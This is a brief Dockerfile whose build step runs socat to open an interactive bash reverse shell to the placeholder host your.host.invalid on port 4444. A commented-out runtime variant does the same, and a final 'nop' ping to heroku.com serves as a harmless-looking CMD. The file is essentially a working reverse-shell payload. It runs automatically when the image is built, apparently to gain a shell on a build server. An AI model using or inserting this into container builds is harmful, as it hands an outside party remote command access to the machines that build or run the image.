FROM alpine:socat
# Buildtime Shell
RUN /usr/bin/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:your.host.invalid:4444
# RUntime shell
#CMD ["/usr/bin/socat","exec:'bash -li',pty,stderr,setsid,sigint,sane", "tcp:your.host.invalid:4444"]
# nop cmd
CMD ["ping","-c", "1", "heroku.com"]
